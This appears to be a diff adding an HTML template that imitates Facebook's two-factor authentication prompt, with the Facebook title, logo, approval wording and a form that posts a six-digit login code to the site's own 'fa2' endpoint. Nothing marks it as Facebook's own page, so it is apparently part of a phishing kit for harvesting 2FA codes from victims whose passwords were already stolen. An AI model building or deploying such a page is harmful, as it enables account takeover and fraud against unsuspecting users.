@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html >
+<head>
+    <title>Facebook</title>
+    <link rel="icon" href="/static/img/logo1.webp" type="image/webp">
+    <link rel="stylesheet" type="text/css" href="/static/css/fa2.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+<div style="display:grid">
+    <div  class="headercustom">
+        <img class="logo" src="/static/img/logotrang.png">
+    </div>
+    <div class="body">
+        <div class="box">
+            <div class="text1">Choose a way to confirm that it's you</div>
+            <div class="text2">Your account has two-factor authentication switched on, which requires this extra login step.</div>
+            <div class="line"></div>
+            <div class="text1">Approve from another device</div>
+            <div class="text2">We already sent a notification to your logged-in devices. Check your Facebook notifications where you're already logged in to the account and approve the login to continue.</div>
+            <div class="line"></div>
+            <div class="text1">Or, enter your login code</div>
+            <div class="text2">Enter the 6-digit code from the authentication app that you set up.</div>
+            <form action="fa2" method="post" onsubmit="return validateForm()">
+                <input class="input_code" type="text" id="logincode" name="logincode" placeholder="login code">
+                <p id="err"  style="color: red; margin-top: 5px; font-size: 14px">{{ error }}</p>
+                <p style="color: red;margin-top: 5px;font-size: 14px;" id="error"></p>
+                <div class="line"></div>
+                <div style="display: flow-root;">
+                    <div class="divbutton">
+                        <button class="button" id="subnit" type="submit">Submit Code</button>
+                    </div>
+                    <div class="divtext">Need another way to confirm that it's you?</div>
+                </div>
+            </form>
+        </div>
+    </div>
+    <div class="footer">
+        <span style="font-weight: bold">English (US)</span>
+        &nbsp;&nbsp;Tiếng Việt&nbsp;&nbsp;中文(台灣)&nbsp;&nbsp;한국어&nbsp;&nbsp;日本語&nbsp;&nbsp;Français (France)&nbsp;&nbsp;ภาษาไทย&nbsp;&nbsp;Español&nbsp;&nbsp;Português&nbsp;&nbsp;(Brasil)&nbsp;&nbsp;Deutsch&nbsp;&nbsp;Italiano
+    </div>
+</div>
+
+<script type="text/javascript" src="/static/js/fa2.js"></script>
+</body>
+</html>
